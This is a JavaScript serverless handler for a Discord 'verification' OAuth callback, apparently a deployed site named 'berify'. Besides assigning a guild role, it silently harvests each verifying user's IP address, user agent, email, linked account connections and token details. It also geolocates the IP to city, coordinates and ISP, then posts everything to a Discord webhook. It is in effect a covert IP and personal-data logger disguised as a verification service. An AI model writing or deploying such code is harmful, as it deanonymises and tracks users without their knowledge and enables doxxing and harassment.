export default async function handler(req, res) {
  const code = req.query.code;
  if (!code) return res.status(400).send("Missing code");

  const {
    DISCORD_CLIENT_ID: client_id,
    DISCORD_CLIENT_SECRET: client_secret,
    DISCORD_BOT_TOKEN: bot_token,
    DISCORD_GUILD_ID: guild_id,
    DISCORD_ROLE_ID: role_id,
    DISCORD_WEBHOOK_URL: webhook_url,
  } = process.env;

  const redirect_uri = "https://berify-topaz.vercel.app/api/callback";

  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || "Unknown IP";
  const userAgent = req.headers['user-agent'] || "Unknown User Agent";

  try {
    // 1. Exchange code for access token
    const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        client_id,
        client_secret,
        grant_type: "authorization_code",
        code,
        redirect_uri,
      }),
    });

    if (!tokenRes.ok) {
      const text = await tokenRes.text();
      console.error("Token exchange failed:", text);
      return res.status(400).send("Failed to get access token: " + text);
    }

    const tokenData = await tokenRes.json();

    if (!tokenData.access_token) {
      console.error("No access token received", tokenData);
      return res.status(400).send("Failed to get access token");
    }

    // 2. Fetch user info
    const userRes = await fetch("https://discord.com/api/users/@me", {
      headers: { Authorization: `Bearer ${tokenData.access_token}` },
    });

    if (!userRes.ok) {
      const text = await userRes.text();
      console.error("User fetch failed:", text);
      return res.status(400).send("Failed to fetch user info: " + text);
    }

    const userData = await userRes.json();

    // 3. Fetch user connections (optional)
    let connectionsData = [];
    try {
      const connectionsRes = await fetch("https://discord.com/api/users/@me/connections", {
        headers: { Authorization: `Bearer ${tokenData.access_token}` },
      });
      if (connectionsRes.ok) connectionsData = await connectionsRes.json();
    } catch {
      // silent fail, no connections
    }

    // 4. Add role to user in guild
    const addRoleRes = await fetch(
      `https://discord.com/api/guilds/${guild_id}/members/${userData.id}/roles/${role_id}`,
      {
        method: "PUT",
        headers: { Authorization: `Bot ${bot_token}` },
      }
    );

    if (!addRoleRes.ok) {
      const errorText = await addRoleRes.text();
      console.error("Failed to add role:", errorText);
      return res.status(500).send("Failed to assign role: " + errorText);
    }

    // 5. IP geolocation
    let geoInfo = {};
    try {
      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,lat,lon,isp,org,timezone,query`);
      geoInfo = await geoRes.json();
      if (geoInfo.status !== "success") geoInfo = {};
    } catch {
      geoInfo = {};
    }

    // 6. Prepare webhook embed fields
    const avatarUrl = userData.avatar
      ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=1024`
      : null;

    const fields = [
      { name: "Username", value: `${userData.username}#${userData.discriminator}`, inline: true },
      { name: "User ID", value: userData.id, inline: true },
      { name: "Email", value: userData.email || "Not provided", inline: false },
      { name: "IP Address", value: ip, inline: false },
      { name: "User Agent", value: userAgent, inline: false },
      { name: "Token Type", value: tokenData.token_type || "unknown", inline: true },
      { name: "Scope", value: tokenData.scope || "unknown", inline: true },
      { name: "Expires In (seconds)", value: (tokenData.expires_in || "unknown").toString(), inline: true },
    ];

    if (geoInfo.country) fields.push({ name: "Country", value: geoInfo.country, inline: true });
    if (geoInfo.regionName) fields.push({ name: "Region", value: geoInfo.regionName, inline: true });
    if (geoInfo.city) fields.push({ name: "City", value: geoInfo.city, inline: true });
    if (geoInfo.lat && geoInfo.lon) fields.push({ name: "Approx. Location", value: `${geoInfo.lat}, ${geoInfo.lon}`, inline: false });
    if (geoInfo.isp) fields.push({ name: "ISP", value: geoInfo.isp, inline: true });
    if (geoInfo.org) fields.push({ name: "Org", value: geoInfo.org, inline: true });
    if (geoInfo.timezone) fields.push({ name: "Timezone", value: geoInfo.timezone, inline: true });

    if (connectionsData.length > 0) {
      fields.push({ name: "Connections", value: connectionsData.map(c => `${c.type}: ${c.name}`).join("\n"), inline: false });
    } else {
      fields.push({ name: "Connections", value: "None or not authorized", inline: false });
    }

    // 7. Send webhook with error handling
    if (webhook_url) {
      try {
        const webhookRes = await fetch(webhook_url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            embeds: [{
              title: "New User Verified",
              color: 0x7289DA,
              thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
              fields,
              timestamp: new Date().toISOString(),
            }],
          }),
        });

        if (!webhookRes.ok) {
          const text = await webhookRes.text();
          console.error("Webhook POST failed:", text);
        }
      } catch (err) {
        console.error("Webhook POST error:", err);
      }
    }

    // 8. Redirect to guild channels page
    return res.redirect(`https://discord.com/channels/${guild_id}`);
  } catch (error) {
    console.error("Unhandled error:", error);
    return res.status(500).send("Server error");
  }
}
